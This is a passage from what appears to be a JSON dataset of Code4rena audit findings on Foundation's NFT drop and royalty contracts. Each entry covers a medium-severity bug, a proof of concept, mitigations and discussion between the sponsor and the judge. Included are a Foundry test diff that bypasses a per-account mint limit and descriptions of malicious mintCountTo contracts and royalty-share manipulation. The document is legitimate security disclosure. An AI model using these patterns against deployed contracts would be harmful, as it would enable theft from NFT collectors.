using this implementation version + msg.sender + nonce\n+ 396:     require(bytes(symbol).length ! 0, \"NFTDropCollection: `symbol` must be set\");\n397:     collection = implementationNFTDropCollection.cloneDeterministic(_getSalt(msg.sender, nonce));\n398: \n399:     INFTDropCollectionInitializer(collection).initialize(\n400:       payable(msg.sender),\n401:       name,\n402:       symbol,\n403:       baseURI,\n404:       postRevealBaseURIHash,\n405:       maxTokenId,\n406:       approvedMinter,\n407:       paymentAddress\n408:     );\n```\n\nThis would save the deployment cost of an impossible to initialize contract (which would further need to be destroyed before being redeployed).\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "#g-01-check-for-bytes_symbollength--0-before-calling-nftdropcollectioninitialize-like-its-done-for-nftcollectioninitialize",
      "tags": [],
      "finders": []
    },
    {
      "id": "3171",
      "title": "[M-08] `mintFromFixedPriceSale` for a custom contract can lead to users losing funds",
      "impact": "MEDIUM",
      "content": "_Submitted by joestakey_\n\n`NFTDropMarketFixedPriceSale.createFixedPriceSale` allows creators to create a sale drop.\nA creator can create a drop sale for their custom NFT Contract that adheres to `INFTDropCollectionMint`.\n\n`INFTDropCollectionMint.mintCountTo` must return the `firstTokenId` being minted, but it is not clear as to what should be returned upon all tokens being minted. A valid implementation could for instance return `0` if called after the last token has been minted.\n\nBut the drop market [expects the call to mintCountTo](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L207) to revert upon the last token being minted, meaning a user calling it afterwards would lose the ETH they sent.\n\n### Proof Of Concept\n\n*   Alice creates a `customERC721` contract adhering to `INFTDropCollectionMint`. She writes `mintCountTo()` so that it returns `0` if called when all the tokens have been minted.\n*   The sale happens and collectors call `mintFromFixedPriceSale` until all the tokens have been minted.\n*   Bob now calls `mintFromFixedPriceSale`. Because all the tokens have been minted, the [call to mintCountTo](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/nftDropMarket/NFTDropMarketFixedPriceSale.sol#L207) does not revert but returns `0`.\n*   The function call then proceeds to distribute the funds.\n*   Bob have lost `mintCost` ETH, while not receiving any NFT.\n\nYou can find this [Foundry test](https://gist.github.com/joestakey/5dc8839c7622bdb9467d743924f072b6) reproducing the issue.\n\nNote that this is not an issue of a malicious creator rugging collectors with a malicious implementation: they have implemented their contract to adhere to `INFTDropCollectionMint`, and the sale went as expected.\n\nIt is not unrealistic to imagine collectors monitoring `CreateFixedPriceSale` and calling `mintFromFixedPriceSale` based on it. In this case, all the `mintFromFixedPriceSale` processed after the last token being minted would lead to loss of funds.\n\n### Tools Used\n\nFoundry\n\n### Recommend Mitigation Steps\n\nYou can add an additional check in `NFTDropMarketFixedPriceSale.mintCountTo()` using `ERC721(nftContract).balanceOf()`.\n\n```diff\n+ uint256 balanceBefore = IERC721(nftContract).balanceOf(msg.sender);\n207:     firstTokenId = INFTDropCollectionMint(nftContract).mintCountTo(count, msg.sender);\n+ uint256 balanceAfter = IERC721(nftContract).balanceOf(msg.sender);\n+ require(balanceAfter == balanceBefore + count, \"minting failed\")\n```\n\nYou can also specify in `INFTDropCollectionMint` that `mintCountTo` must revert if called after all tokens have been minted.\n\n**[HardlyDifficult (Foundation) marked as duplicate and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/279#issuecomment-1220574136):**\n > Although this submission uses a different POC, we believe it's the same issue & root cause as [#211](https://github.com/code-423n4/2022-08-foundation-findings/issues/211).\n> \n> Dupe of [#211](https://github.com/code-423n4/2022-08-foundation-findings/issues/211).\n\n**[joestakey (warden) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/279#issuecomment-1229461934):**\n > I will argue this issue is actually different than [#211](https://github.com/code-423n4/2022-08-foundation-findings/issues/211), although they both come from the same function call:\n> \n> - In [#211](https://github.com/code-423n4/2022-08-foundation-findings/issues/211), the issue lies in the logic performed in `INFTDropCollectionMint.mintCountTo()`, more precisely the fact that a malicious implementation can perform incorrect state logic, which results in any collector calling `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` losing funds without receiving the expected amount of NFTs.\n> - Here, the issue lies in the return value of `INFTDropCollectionMint.mintCountTo()` in an edge case - when all the tokens have been minted. There is no malicious implementation or wrong state logic: users calling `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` will receive the expected amount of NFTs. The problem is when the minting is done: the `DropMarket` expect subsequent calls to `mintCountTo()` to fail. While you can argue not reverting after the final token has been minted is breaking a semantic requirement, it still complies with the interface `INFTDropCollectionMint`. Not reverting on failure is a behavior that exists in other standards, such as some ERC20 tokens for instance, like [ZRX](https://etherscan.io/address/0xe41d2489571d322189246dafa5ebde1f4699f498#code).\n> \n> To illustrate the difference between the two issues, take the NFT contract used in the PoC for this issue: users calling `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale` will receive the expected amount of NFTs - i.e. it is not affected by the issue #211. The problem arises only upon the final token being minted.\n> \n> In summary, [#211](https://github.com/code-423n4/2022-08-foundation-findings/issues/211) is about malicious implementations that users should be made aware of (docs or UI warnings) while this issue has to do with the fact `INFTDropCollectionMint.mintCountTo()` should define a stricter behavior when the last token has been minted, perhaps by adding a comment such as:\n> ```\n> /// if the minting fails it MUST result in the transaction being reverted.\n> ```\n> \n> @HickupHH3 thoughts?\n> \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/279#issuecomment-1240810016):**\n> The root cause for both issues is about the \"potential errors in the implementation or misunderstanding of the interface requirements\". Simply put, the ambiguity regarding the specification of `mintCountTo()` allows for it to be exploited. As you pointed out, #211 is exploited by malicious implementations while this issue happens even if the implementation is seemingly compliant to the interface because of the ambiguity.\n> \n> It's a tough decision because while the methods are different, the root cause and consequence (users losing funds) are the same.\n> \n> I'll side with you on this one, because the attack vectors are quite distinct. It's similar to how I separated the strategist rug vectors for the Rubicon contest.\n\n\n\n***\n\n\n\n",
      "summary": "\nThis bug report describes an issue with the `mintFromFixedPriceSale` function of the `NFTDropMarketFixedPriceSale` contract. This function is used to create a sale drop for custom NFT Contracts that adhere to the `INFTDropCollectionMint` interface. The bug occurs when the `INFTDropCollectionMint.mintCountTo` function returns `0` after the last token has been minted, which can lead to users calling the `mintFromFixedPriceSale` function losing the ETH they sent.\n\nThe impact of this issue is rated as medium. Manual Analysis and Foundry tools were used to identify the bug.\n\nTo mitigate this issue, an additional check can be added to the `NFTDropMarketFixedPriceSale.mintCountTo` function using the `ERC721.balanceOf` function. Alternatively, the `INFTDropCollectionMint` interface can be updated to specify that `mintCountTo` must revert if called after all tokens have been minted.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/279",
      "tags": [],
      "finders": [
        "joestakey"
      ]
    },
    {
      "id": "3170",
      "title": "[M-07] NFT of NFT collection or NFT drop collection can be locked when calling _mint or mintCountTo function to mint it to a contract that does not support ERC721 protocol",
      "impact": "MEDIUM",
      "content": "_Submitted by rbserver, also found by 0xc0ffEE, 0xsolstars, berndartmueller, Bnke0x0, brgltd, cccz, CodingNameKiki, Deivitto, Diraco, Dravee, durianSausage, erictee, ignacio, IllIllI, joestakey, KIntern&#95;NA, Lambda, LeoS, Noah3o6, oyc&#95;109, ReyAdmirado, Rohan16, Rolezn, Sm4rty, Treasure-Seeker, zeesaw, and zkhorse_\n\n<https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274>\n\n<https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187>\n\n### Impact\n\nWhen calling the following `_mint` or `mintCountTo` function for minting an NFT of a NFT collection or NFT drop collection, the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is used to mint the NFT to a receiver. If such receiver is a contract that does not support the ERC721 protocol, the NFT will be locked and cannot be retrieved.\n\n<https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274>\n\n      function _mint(string calldata tokenCID) private onlyCreator returns (uint256 tokenId) {\n        require(bytes(tokenCID).length != 0, \"NFTCollection: tokenCID is required\");\n        require(!cidToMinted[tokenCID], \"NFTCollection: NFT was already minted\");\n        unchecked {\n          // Number of tokens cannot overflow 256 bits.\n          tokenId = ++latestTokenId;\n          require(maxTokenId == 0 || tokenId <= maxTokenId, \"NFTCollection: Max token count has already been minted\");\n          cidToMinted[tokenCID] = true;\n          _tokenCIDs[tokenId] = tokenCID;\n          _mint(msg.sender, tokenId);\n          emit Minted(msg.sender, tokenId, tokenCID, tokenCID);\n        }\n      }\n\n<https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187>\n\n      function mintCountTo(uint16 count, address to) external onlyMinterOrAdmin returns (uint256 firstTokenId) {\n        require(count != 0, \"NFTDropCollection: `count` must be greater than 0\");\n\n        unchecked {\n          // If +1 overflows then +count would also overflow, unless count==0 in which case the loop would exceed gas limits\n          firstTokenId = latestTokenId + 1;\n        }\n        latestTokenId = latestTokenId + count;\n        require(latestTokenId <= maxTokenId, \"NFTDropCollection: Exceeds max tokenId\");\n\n        for (uint256 i = firstTokenId; i <= latestTokenId; ) {\n          _mint(to, i);\n          unchecked {\n            ++i;\n          }\n        }\n      }\n\nFor reference, [OpenZeppelin's documentation for `_mint`](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#ERC721-\\_mint-address-uint256-) states: \"Usage of this method is discouraged, use \\_safeMint whenever possible\".\n\n### Proof of Concept\n\nThe following steps can occur when minting an NFT of a NFT collection or NFT drop collection.\n\n1.  The [`_mint`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L262-L274) or [`mintCountTo`](https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L171-L187) function is called with `msg.sender` or the `to` input corresponding to a contract.\n2.  The OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function is called with `msg.sender` or `to` used in Step 1 as the receiver address.\n3.  Since calling the OpenZeppelin's `ERC721Upgradeable` contract's [`_mint`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L284-L296) function does not execute the same contract's [`_checkOnERC721Received`](https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC721/ERC721Upgradeable.sol#L400-L422) function, it is unknown if the receiving contract inherits from the `IERC721ReceiverUpgradeable` interface and implements the `onERC721Received` function or not. It is possible that the receiving contract does not support the ERC721 protocol, which causes the minted NFT to be locked.\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\n<https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTCollection.sol#L271> can be changed to the following code.\n\n    _safeMint(msg.sender, tokenId);\n\nAlso, <https://github.com/code-423n4/2022-08-foundation/blob/main/contracts/NFTDropCollection.sol#L182> can be changed to the following code.\n\n    _safeMint(to, i);\n\n**[HardlyDifficult (Foundation) confirmed and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/183#issuecomment-1219513491):**\n > Agree will fix.\n> \n> Generally we are inclined to skip \"safe\" by default - it can introduce reentrancy & reverting risk and increase gas costs. When a user is making an action to buy or mint an NFT for themselves, it's very clear that they are trying to acquire an NFT - so using safe to ensure that they support NFTs seems like a Low risk concern and we are inclined to avoid potential reentrancy/reverts and save costs for the common user paths.\n> \n> However in this scenario the part that stood out as different is instead of minting for yourself (the msg.sender) we support minting to an arbitrary `to` address, e.g. for an airdrop type use case. Here specifically it does seem that sending to a list of addresses could be error prone, where a contract address without 721 support was incorrectly captured. To guard against that scenario specifically we are moving forward with this change.\n> \n> Then for consistency we have decided to use safeMint for both collection types because the difference is nuanced.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the _mint and mintCountTo functions of the NFTCollection and NFTDropCollection contracts. When calling these functions, the OpenZeppelin's ERC721Upgradeable contract's _mint function is used to mint the NFT to a receiver. If the receiver is a contract that does not support the ERC721 protocol, the NFT will be locked and cannot be retrieved.\n\nThe vulnerability can be demonstrated with the following steps:\n1. The _mint or mintCountTo function is called with msg.sender or the to input corresponding to a contract.\n2. The OpenZeppelin's ERC721Upgradeable contract's _mint function is called with msg.sender or to used in Step 1 as the receiver address.\n3. Since calling the OpenZeppelin's ERC721Upgradeable contract's _mint function does not execute the same contract's _checkOnERC721Received function, it is unknown if the receiving contract inherits from the IERC721ReceiverUpgradeable interface and implements the onERC721Received function or not. It is possible that the receiving contract does not support the ERC721 protocol, which causes the minted NFT to be locked.\n\nThe recommended mitigation steps are to change the code of the _mint and mintCountTo functions to use the _safeMint function instead. This will ensure that the receiving contract supports the ERC721 protocol, and the minted NFT will not be locked.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/183",
      "tags": [
        "mint vs safeMint"
      ],
      "finders": [
        "LeoS",
        "brgltd",
        "berndartmueller",
        "Bnke0x0",
        "rbserver",
        "Rohan16",
        "joestakey",
        "ReyAdmirado",
        "zeesaw",
        "CodingNameKiki",
        "Lambda",
        "ignacio",
        "Sm4rty",
        "Noah3o6",
        "Diraco",
        "IllIllI",
        "Deivitto",
        "cccz",
        "erictee",
        "0xsolstars",
        "zkhorse",
        "oyc_109",
        "Treasure-Seeker",
        "durianSausage",
        "KIntern_NA",
        "Rolezn",
        "Dravee",
        "0xc0ffEE"
      ]
    },
    {
      "id": "3169",
      "title": "[M-06] Malicious Creator can steal from collectors upon minting with a custom NFT contract",
      "impact": "MEDIUM",
      "content": "_Submitted by joestakey, also found by byndooa_\n\nIn the case of a fixed price sale where `nftContract` is a custom NFT contract that adheres to `INFTDropCollectionMint`, a malicious creator can set a malicious implementation of `INFTDropCollectionMint.mintCountTo()` that would result in collectors calling this function losing funds without receiving the expected amount of NFTs.\n\n### Proof Of Concept\n\nHere is a [Foundry test](https://gist.github.com/joestakey/4b13c7ae6029332da6eaf63b9d2a38bd) that shows a fixed price sale with a malicious NFT contract, where a collector pays for 10 NFTs while only receiving one. It can be described as follow:\n\n*   A creator creates a malicious `nftContract` with `mintCountTo` minting only one NFT per call, regardless of the value of `count`\n\n*   The creator calls `NFTDropMarketFixedPriceSale.createFixedPriceSale()` to create a sale for `nftContract`, with `limit` set to `15`.\n\n*   Bob is monitoring the `CreateFixedPriceSale` event. Upon noticing `CreateFixedPriceSale(customERC721, Alice, price, limit)`, he calls `NFTDropMarketFixedPriceSale.mintFromFixedPriceSale(customERC721, count == 10,)`. He pays the price of `count = 10` NFTs, but because of the logic in `mintCountTo`, only receives one NFT.\n\nNote that `mintCountTo` can be implemented in many malicious ways, this is only one example. Another implementation could simply return `firstTokenId` without performing any minting.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThe problem here lies in the implementation of `INFTDropCollectionMint(nftContract).mintCountTo()`. You could add an additional check in `NFTDropMarketFixedPriceSale.mintCountTo()` using `ERC721(nftContract).balanceOf()`.\n\n```diff\n+ uint256 balanceBefore = IERC721(nftContract).balanceOf(msg.sender);\n207:     firstTokenId = INFTDropCollectionMint(nftContract).mintCountTo(count, msg.sender);\n+ uint256 balanceAfter = IERC721(nftContract).balanceOf(msg.sender);\n+ require(balanceAfter == balanceBefore + count, \"minting failed\")\n```\n\n**[itsmeSTYJ (warden) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/211#issuecomment-1217433818):**\n > This assumes a custom NFT contract with a bad implementation of `mintCountTo` which _may_ be a stretch but I agree that your mitigation steps should be added as a sanity check.\n\n**[HardlyDifficult (Foundation) confirmed and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/211#issuecomment-1220577342):**\n > We will be making the recommended change.\n> \n> There's not really anything we can do to completely stop malicious contracts - this is an inherit risk with NFT marketplaces. Even the recommended solution here is something a malicious contract could fake in order to bypass that requirement.\n> \n> What sold us on making a change here was not malicious creators / contracts but instead potential errors in the implementation or misunderstanding of the interface requirements our marketplace expects. To prevent these errors, we are introducing the recommended change (and it only added 1,300 gas to the mint costs!)\n\n\n\n***\n\n",
      "summary": "\nA vulnerability was discovered in the code of the NFTDropMarketFixedPriceSale.sol contract, which allows malicious creators to steal from collectors upon minting with a custom NFT contract. This vulnerability has a medium impact. \n\nThe proof of concept for this vulnerability is as follows: A malicious creator creates a malicious NFT contract with a function that only mints one NFT per call, regardless of the value of 'count'. The creator then calls the NFTDropMarketFixedPriceSale.createFixedPriceSale() function to create a sale for the malicious NFT contract, with 'limit' set to '15'. Bob notices this sale and calls the NFTDropMarketFixedPriceSale.mintFromFixedPriceSale() function, paying for 10 NFTs but only receiving one due to the logic in the mintCountTo function.\n\nThe mitigation for this vulnerability is to add an additional check in the NFTDropMarketFixedPriceSale.mintCountTo() function using the ERC721.balanceOf() function. This would ensure that the balance of the sender remains unchanged after the minting is complete.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/211",
      "tags": [],
      "finders": [
        "byndooa",
        "joestakey"
      ]
    },
    {
      "id": "3168",
      "title": "[M-05] User may get all of the creator fees by specifying high number for himself",
      "impact": "MEDIUM",
      "content": "_Submitted by Lambda, also found by 0x52, KIntern&#95;NA, and shenwilly_\n\nIf one creator specified a share that is larger than `BASIS_POINTS`, the first creator gets all of the royalties. Depending on how these are set (which is not in the control of the project), this can be exploited by the first creator.\n\n### Proof Of Concept\n\nA collective of artists have implemented a process where everyone can set its own share of the fees to the value that he thinks is fair and these values are returned by `getRoyalties`. Bob, the first entry in the list of `_recipients` sets its value to a value that is slightly larger than `BASIS_POINTS` such that he gets all of the royalties.\n\n### Recommended Mitigation Steps\n\nThere is no need for this check / logic, as the whole sum (`totalShares`) is used anyway to normalize the values.\n\n**[HardlyDifficult (Foundation) acknowledged, but disagreed with severity and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/34#issuecomment-1218477008):**\n> We believe this is Low risk. For the Foundation collections, the royalty rate is hard coded to 10% or via `PercentSplitETH` which is not subject to this issue. For 3rd party collections, there are more direct ways to change the distribution if the creator was attempting to be malicious towards their partners -- esp via the Royalty Registry.\n> \n> This report is true. And the recommendation seems reasonable. However we will not be making this change. We are currently investigating changing our royalty logic in order to use the values returned by collections directly, instead of normalizing it to 10% like we do now. Most of the royalty APIs used here are not official standards, but are becoming industry standards based on growing adoption -- and they are expecting the percent amounts to be defined in Basis Points.\n> \n> We do not want to mislead the community too much to ease the pain of the potential upcoming change I mentioned above. If they are returning values > 10,000 we don't want that pattern to be adopted by more collections.\n> \n> Another option may be to ignore the results if `totalShares` sums to > 10,000 - that's tempting but we are going to defer making a change like that until a future workstream which will be more dedicated to rethinking royalties.\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/34#issuecomment-1229082114):**\n > Am siding with the warden here, because for 3rd party collections, it may be the case that they use a larger denomination than basis points. As mentioned in a different issue, royalty standards are still in its infancy.\n> \n> > Most of the royalty APIs used here are not official standards, but are becoming industry standards based on growing adoption -- and they are expecting the percent amounts to be defined in Basis Points.\n> \n> Hopeful for this to be the case so there is less ambiguity, and non-compliance can be ignored as suggested by the sponsor.\n\n\n\n***\n\n",
      "summary": "\nThe bug report states that if one creator sets a share that is larger than the \"BASIS_POINTS\" value, the first creator will get all of the royalties. This can be exploited by the first creator, depending on how the settings are configured. The proof of concept states that a collective of artists have implemented a process where everyone can set its own share of the fees to the value they think is fair, and then Bob, the first entry in the list of \"_recipients\" sets its value to a value that is slightly larger than \"BASIS_POINTS\" such that he gets all of the royalties. The recommended mitigation step is to remove the check/logic, as the whole sum (`totalShares`) is used to normalize the values anyway. This bug report is a warning to developers to be aware of the potential for exploitation when setting up their systems, and to ensure that the settings are configured correctly.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/34",
      "tags": [
        "Validation"
      ],
      "finders": [
        "shenwilly",
        "Lambda",
        "0x52",
        "KIntern_NA"
      ]
    },
    {
      "id": "3167",
      "title": "[M-04] Possible to bypass saleConfig.limitPerAccount",
      "impact": "MEDIUM",
      "content": "_Submitted by itsmeSTYJ, also found by 0x1f8b, 0x52, 0xDjango, auditor0517, byndooa, cccz, Ch&#95;301, Chom, csanuragjain, KIntern&#95;NA, ladboy233, nine9, PwnedNoMore, shenwilly, thank&#95;you, Treasure-Seeker, wagmi, yixxas, and zkhorse_\n\nIt is possible to bypass the `saleConfig.limitPerAccount` set by the creator by transferring the NFTs out. For highly sought after NFT drops, a single smart contract can buy out the entire drop simply by calling `mintFromFixedPriceSale` then transferring the NFTs out and repeating the process multiple times.\n\n### Proof of Concept\n\nModify the `FixedPriceDrop.sol` Foundry test with the following changes.\n\n```diff\ndiff --git a/FixedPriceDrop.sol.orig b/FixedPriceDrop.sol\nindex 0a6d698..56808f8 100644\n--- a/FixedPriceDrop.sol.orig\n+++ b/FixedPriceDrop.sol\n@@ -71,14 +71,26 @@ contract TestFixedPriceDrop is Test {\n \n     /** List for sale **/\n     uint80 price = 0.5 ether;\n-    uint16 limitPerAccount = 10;\n+    uint16 limitPerAccount = 3;\n     vm.prank(creator);\n     nftDropMarket.createFixedPriceSale(address(nftDropCollection), price, limitPerAccount);\n \n     /** Mint from sale **/\n     uint16 count = 3;\n     vm.deal(collector, 999 ether);\n-    vm.prank(collector);\n+    vm.startPrank(collector);\n+    nftDropMarket.mintFromFixedPriceSale{ value: price * count }(address(nftDropCollection), count, payable(0));\n+\n+    // Check that available count for collector is 0\n+    uint256 remaining = nftDropMarket.getAvailableCountFromFixedPriceSale(address(nftDropCollection), collector);\n+    assertEq(remaining, 0);\n+\n+    // Transfer all bought NFTs out\n+    nftDropCollection.transferFrom(collector, address(5), 1);\n+    nftDropCollection.transferFrom(collector, address(5), 2);\n+    nftDropCollection.transferFrom(collector, address(5), 3);\n+\n+    // Buy 3 more NFT\n     nftDropMarket.mintFromFixedPriceSale{ value: price * count }(address(nftDropCollection), count, payable(0));\n   }\n }\n```\n\n### Tools Used\n\nFoundry\n\n#### Recommended Mitigation Steps\n\nUse a mapping to track how many NFTs an address has bought instead of relying on `balanceOf`.\n\n**[HardlyDifficult (Foundation) acknowledged and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/59#issuecomment-1218494243):**\n> This is accurate! We had several meetings about this concern while building the contract, ultimately deciding to move forward with this approach knowing that it has limitations. The trouble is every limit solution suggested and used in the wild today can be gamed, it's just varying levels of friction for an attacker to work around it. Once someone has coded up a workaround, it could easily be used on any of the collections being sold by our marketplace. So we decided to KISS.\n> \n> But if it can be gamed, why include a limit at all? Creators want one. It sets expectations with the community and makes the sale feel more fair. Many users will respect the limit as communicated - we suspect more often than not, this simple limit check will be sufficient.\n> \n> What if it's not sufficient? If someone were to clearly abuse the system it may degrade the value of the collection for all. There are options available to the creator at that point. For example, the creator could create a new collection to replace the original - airdropping NFTs to their legit holders, or allowing them to do an NFT swap (so the original collection can slowly be removed from circulation) -- this swap could also have a deny list so that the abused sales cannot be used to redeem from the new collection, and presumably the original collection will quickly lose value so long as the creator's community is on board with this process. Or the creator and their community could choose to simply accept that the sale went down this way and wait for things to balance out again on the secondary market.\n> \n> I selected this instance as the primary submission for having a simple & clear coded POC.\n> \n> We agree Medium risk is appropriate for this since it could \"leak value with a hypothetical attack path with stated assumptions\".\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the NFTDropMarketFixedPriceSale.sol contract which allows users to bypass the saleConfig.limitPerAccount set by the creator. This could be exploited by a single smart contract to buy out the entire drop by calling the mintFromFixedPriceSale function multiple times. A proof of concept was provided, which modified the FixedPriceDrop.sol foundry test by reducing the limitPerAccount to 3 and transferring the bought NFTs out. The recommended mitigation step is to use a mapping to track how many NFTs an address has bought instead of relying on balanceOf.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Foundation",
      "source_link": "https://code4rena.com/reports/2022-08-foundation",
      "github_link": "https://github.com/code-423n4/2022-08-foundation-findings/issues/59",
      "tags": [
        "NFT"
      ],
      "finders": [
        "0x52",
        "yixxas",
        "ladboy233",
        "Ch_301",
        "byndooa",
        "0xDjango",
        "Chom",
        "itsmeSTYJ",
        "nine9",
        "0x1f8b",
        "PwnedNoMore",
        "csanuragjain",
        "thank_you",
        "cccz",
        "auditor0517",
        "zkhorse",
        "Treasure-Seeker",
        "KIntern_NA",
        "shenwilly",
        "wagmi"
      ]
    },
    {
      "id": "3166",
      "title": "[M-03] Forget to check \"Some manifolds contracts of ERC-2981 return (address(this), 0) when royalties are not defined\" in 3rd priority - MarketFees.sol",
      "impact": "MEDIUM",
      "content": "_Submitted by KIntern&#95;NA, also found by bin2chen and Lambda_\n\nWrong return of `cretorShares` and `creatorRecipients` can make real royalties party can't gain the revenue of sale.\n\n### Proof of concept\n\nFunction `getFees()` firstly [call](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L422-L430) to function `internalGetImmutableRoyalties` to get the list of `creatorRecipients` and `creatorShares` if the `nftContract` define ERC2981 royalties.\n\n```solidity\ntry implementationAddress.internalGetImmutableRoyalties(nftContract, tokenId) returns (\n  address payable[] memory _recipients,\n  uint256[] memory _splitPerRecipientInBasisPoints\n) {\n  (creatorRecipients, creatorShares) = (_recipients, _splitPerRecipientInBasisPoints);\n} catch // solhint-disable-next-line no-empty-blocks\n{\n  // Fall through\n}\n```\n\n***\n\nIn the [1st priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L236-L255) it check the `nftContract` define the function `royaltyInfo` or not. If yes, it get the return value `receiver` and `royaltyAmount`. In some manifold contracts of erc2981, it `return (address(this), 0)` when royalties are not defined. So we ignore it when the `royaltyAmount = 0`\n\n```solidity\n  try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (\n    address receiver,\n    uint256 royaltyAmount\n  ) {\n    // Manifold contracts return (address(this), 0) when royalties are not defined\n    // - so ignore results when the amount is 0\n    if (royaltyAmount > 0) {\n      recipients = new address payable[](1);\n      recipients[0] = payable(receiver);\n      splitPerRecipientInBasisPoints = new uint256[](1);\n      // The split amount is assumed to be 100% when only 1 recipient is returned\n      return (recipients, splitPerRecipientInBasisPoints);\n    }\n```\n\n***\n\nIn the same sense, the [3rd priority](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L297-L312) (it can reach to 3rd priority when function `internalGetImmutableRoyalies` fail to return some royalties) should check same as the 1st priority with the `royaltyRegistry.getRoyaltyLookupAddress`. But the 3rd priority forget to check the case when `royaltyAmount == 0`.\n\n```solidity\n  try IRoyaltyInfo(nftContract).royaltyInfo{ gas: READ_ONLY_GAS_LIMIT }(tokenId, BASIS_POINTS) returns (\n    address receiver,\n    uint256 /* royaltyAmount */\n  ) {\n    recipients = new address payable[](1);\n    recipients[0] = payable(receiver);\n    splitPerRecipientInBasisPoints = new uint256[](1);\n    // The split amount is assumed to be 100% when only 1 recipient is returned\n    return (recipients, splitPerRecipientInBasisPoints);\n  } \n```\n\nIt will make [function](https://github.com/code-423n4/2022-08-foundation/blob/792e00df429b0df9ee5d909a0a5a6e72bd07cf79/contracts/mixins/shared/MarketFees.sol#L98) `_distributeFunds()` transfer to the wrong `creatorRecipients` (for example erc2981 return `(address(this), 0)`, market will transfer creator revenue to `address(this)` - market contract, and make the fund freeze in contract forever).\n\nThis case just happen when\n\n*   `nftContract` doesn't have any support for royalties info\n*   `overrideContract` which was fetched from`royaltyRegistry.getRoyaltyLookupAddress(nftContract)` implements both function `getRoyalties` and `royaltyInfo` but doesn't support `royaltyInfo` by returning `(address(this), 0)`.\n\n### Recommended Mitigation Steps\n\nAdd check if `royaltyAmount > 0` or not in 3rd priority.\n\n**[HardlyDifficult (Foundation) confirmed and commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/147#issuecomment-1220593088):**\n > This was a great catch. We will be making the recommended change.\n> \n> Medium risk seems correct as this is a form of potentially leaking value.\n> \n> We agree that any contract returning `(address(this), 0)` should be treated as no royalties defined instead of paying to `address(this)`. \n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-08-foundation-findings/issues/147#issuecomment-1228039151):**\n > Yes, agree that zero royalty amount check is missing for 3rd priority.\n\n\n\n***\n\n",
